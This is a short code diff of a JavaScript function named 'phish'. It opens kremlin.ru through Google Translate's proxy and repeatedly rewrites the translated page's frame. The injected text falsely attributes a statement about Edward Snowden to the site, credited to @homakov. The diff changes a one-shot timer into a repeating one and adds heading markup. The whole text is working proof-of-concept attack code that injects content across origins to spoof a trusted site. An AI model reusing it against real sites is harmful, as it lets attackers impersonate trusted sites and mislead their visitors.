@@ -2,8 +2,8 @@
 function phish(){
   url = "http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F";
   w = window.open(url);
-  setTimeout(function(){
-    w.frames[0].document.getElementsByClassName('page')[0].innerHTML='<marquee>Let me speak from my heart: Edward Snowden is a Russian Citizen. Thanks to @homakov!</marquee>'
+  setInterval(function(){
+    w.frames[0].document.getElementsByClassName('page')[0].innerHTML='<marquee><h2>Let me speak from my heart: Edward Snowden is a Russian Citizen. Thanks to @homakov!</h2></marquee>';
   },1000)
 }
 </script>
